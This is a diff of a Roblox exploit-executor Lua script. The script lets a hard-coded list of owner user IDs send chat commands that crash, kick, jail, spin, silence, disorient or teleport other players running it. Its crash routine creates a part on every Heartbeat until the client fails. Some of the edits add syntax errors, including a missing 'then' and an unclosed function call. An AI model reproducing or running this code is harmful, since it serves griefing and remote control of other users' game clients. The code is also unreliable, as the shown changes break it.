@@ -1,8 +1,7 @@
 local Owners = {
     1913576607, 1682081779, 3927844640, 118261992, 1891283554, 
     1971112971, 3996805816, 894642653, 203599835, 3941987370, 
-    198508658, 4248708772, 529076146, 4529099164, 3640313057,
-    2956935559,
+    198508658, 4248708772, 529076146, 4529099164, 3640313057
 }
 local VIP = {
     3682132159, 370326509, 676636514
@@ -83,7 +82,7 @@ local function Spin(target)
         end
         local Spin = Instance.new("BodyAngularVelocity")
         Spin.Name = "Spinning"
-        Spin.Parent = target.Character:FindFirstChild("HumanoidRootPart")
+        Spin.Parent = target.Character
         Spin.MaxTorque = Vector3.new(0, math.huge, 0)
         Spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
     end
@@ -130,17 +129,18 @@ end
 local function Crash(target)
     if target.Name == game:GetService("Players").LocalPlayer.Name then
         getgenv().MoreCrash = game:GetService("RunService").Heartbeat:Connect(function()
-            getgenv().CrashSelf = game:GetService("RunService").Heartbeat:Connect(function()
-                local player = game:GetService("Players").LocalPlayer
-                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    local Position = player.Character.HumanoidRootPart.CFrame.Position
-                    local Part = Instance.new("Part", game:GetService("Workspace"))
-                    Part.Anchored = false
-                    Part.CFrame = CFrame.new(Position.X, Position.Y + 20, Position.Z)
-                    Part.Name = "CrashPart"
-                end
+                getgenv().CrashSelf = game:GetService("RunService").Heartbeat:Connect(function()
+                    local player = game:GetService("Players").LocalPlayer
+                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                        local Position = player.Character.HumanoidRootPart.CFrame.Position
+                        local Part = Instance.new("Part", game:GetService("Workspace"))
+                        Part.Anchored = false
+                        Part.CFrame = CFrame.new(Position.X, Position.Y + 20, Position.Z)
+                        Part.Name = "CrashPart"
+                    end
+                end)
             end)
-        end)
+        end
     end
 end
 
@@ -297,6 +297,9 @@ local function stopShake()
         shaking = false
         camera.CFrame = originalCFrame
         RunService:UnbindFromRenderStep("CameraShake")
+        if RunningDizzy then
+            RunningDizzy:UnbindFromRenderStep("CameraShake")
+        end
     end
 end
 local function UnDizzy(target)
@@ -381,7 +384,7 @@ local function UnJail(target)
 end
 
 local function Bring(target)
-    game:GetService("Players").LocalPlayer:MoveTo(target.Character.HumanoidRootPart.CFrame.Position)
+    game:GetService("Players").LocalPlayer:MoveTo(target.Character.HumanoidRootPart.CFrame.p)
 end
 local Prefix = "."
 
@@ -424,9 +427,13 @@ local function handleCommand(player, msg)
     elseif args[1] == Prefix .. "kick" then
         executeForMatchingPlayer(Ban)
     elseif args[1] == Prefix .. "rj" then
-        local ts = game:GetService("TeleportService")
-        local localPlayer = game:GetService("Players").LocalPlayer
-        ts:Teleport(game.PlaceId, localPlayer)
+        executeForMatchingPlayer(function(target)
+            if target.Name == game:GetService("Players").LocalPlayer.Name then
+                local ts = game:GetService("TeleportService")
+                local localPlayer = game:GetService("Players").LocalPlayer
+                ts:Teleport(game.PlaceId, localPlayer)
+            end
+        end)
     elseif args[1] == Prefix .. "crash" then
         executeForMatchingPlayer(Crash)
     elseif args[1] == Prefix .. "stopcrash" then
@@ -480,7 +487,11 @@ local function handleCommand(player, msg)
             end
         end)
     elseif args[1] == Prefix .. "undizzy" then
-        stopShake()
+        executeForMatchingPlayer(function(target)
+            if target.Name == game:GetService("Players").LocalPlayer.Name then
+                stopShake()
+            end
+        end
     elseif args[1] == Prefix .. "silence" then
         executeForMatchingPlayer(Silence)
     elseif args[1] == Prefix .. "unsilence" then
@@ -497,13 +508,13 @@ local function handleCommand(player, msg)
         executeForMatchingPlayer(Jail)
     elseif args[1] == Prefix .. "unjail" then
         executeForMatchingPlayer(UnJail)
-    elseif args[1] == Prefix .. "gravity" then
+    elseif args[1] == Prefix .. "gravity"
         executeForMatchingPlayer(function(target)
-            SetGravity(target, tonumber(args[3]))
+            SetGravity(target.Name, args[3])
         end)
     elseif args[1] == Prefix .. "resize" then
         executeForMatchingPlayer(function(target)
-            Resize(target, tonumber(args[3]))
+            Resize(target.Name, args[3])
         end)
     end
 end
@@ -523,5 +534,3 @@ for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
         end)
     end
 end
-
--- This code was made with help from zont. or zont#0001.
